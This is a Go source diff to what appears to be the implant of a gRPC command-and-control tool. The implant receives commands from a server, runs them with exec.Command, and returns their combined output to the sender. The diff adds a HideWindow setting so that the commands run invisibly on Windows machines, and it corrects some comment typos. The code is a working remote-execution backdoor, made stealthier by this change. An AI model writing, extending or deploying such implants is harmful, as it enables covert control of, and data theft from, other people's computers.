@@ -8,6 +8,7 @@ import (
 	"os/exec"
 	"strconv"
 	"strings"
+	"syscall"
 	"time"
 
 	"google.golang.org/grpc"
@@ -99,10 +100,14 @@ func main() {
 		var instr *exec.Cmd                  //golang specific method of executing syscalls is with "exec"
 		if len(tokens) == 1 {
 			instr = exec.Command(tokens[0]) //if only one token, then execute the first.
+			//disable the window pop-up
+			instr.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 		} else {
 			instr = exec.Command(tokens[0], tokens[1:]...) //exec works like execv in C, by executing a command as a vector of inputs
+			//disable the window pop-up
+			instr.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 		}
-		//
+		//create comnined output of command to sned to implant
 		buffer, err := instr.CombinedOutput()
 		if err != nil {
 			cmd.Out = err.Error()
@@ -110,6 +115,6 @@ func main() {
 		//assign the commad the reconstituted tokenized input
 		cmd.Out += string(buffer)
 		//send to the client the
-		client.SendOutput(ctx, cmd) //when a comamd is issued, it sends the output back to the sender via contexts.
+		client.SendOutput(ctx, cmd) //when a command is issued, it sends the output back to the sender via contexts.
 	}
 }
